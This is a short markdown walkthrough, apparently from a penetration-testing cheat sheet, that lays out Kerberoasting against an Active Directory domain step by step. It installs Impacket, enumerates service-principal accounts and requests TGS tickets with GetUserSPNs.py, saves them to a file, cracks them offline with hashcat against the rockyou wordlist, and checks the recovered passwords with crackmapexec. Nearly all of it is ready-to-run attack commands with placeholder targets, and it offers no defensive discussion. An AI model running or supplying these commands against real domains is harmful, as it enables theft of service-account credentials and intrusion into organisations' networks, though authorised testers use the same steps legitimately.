---
legal-banner: true
---

### **Step 1: Set Up Impacket Tools**

1. Clone the Impacket repository:  
   ```bash
   git clone https://github.com/SecureAuthCorp/impacket.git
   ```

2. Navigate to the Impacket directory:  
   ```bash
   cd impacket
   ```

3. Install Impacket using pip:  
   ```bash
   sudo python3 -m pip install .
   ```

### **Step 2: List Accounts and Request TGS Tickets**

4. List SPN accounts:  
   ```bash
   GetUserSPNs.py -dc-ip [DC-IP] [DOMAIN]/[USERNAME]
   ```

5. Request TGS tickets:  
   ```bash
   GetUserSPNs.py -dc-ip [DC-IP] [DOMAIN]/[USERNAME] -request
   ```

### **Step 3: Request Specific TGS Tickets and Save to File**

6. Request a specific TGS ticket:  
   ```bash
   GetUserSPNs.py -dc-ip [DC-IP] [DOMAIN]/[USERNAME] -request-user [SPN-USERNAME]
   ```

7. Save TGS tickets to a file:  
   ```bash
   GetUserSPNs.py -dc-ip [DC-IP] [DOMAIN]/[USERNAME] -request-user [SPN-USERNAME] -outputfile [OUTPUT-FILE]
   ```

### **Step 4: Crack TGS Tickets and Confirm Access**

8. Crack TGS tickets offline:  
   ```bash
   hashcat -m 13100 [TGS-FILE] /usr/share/wordlists/rockyou.txt
   ```

9. Confirm access with the cracked credentials:  
   ```bash
   crackmapexec smb [DC-IP] -u [USERNAME] -p [PASSWORD]
   ```
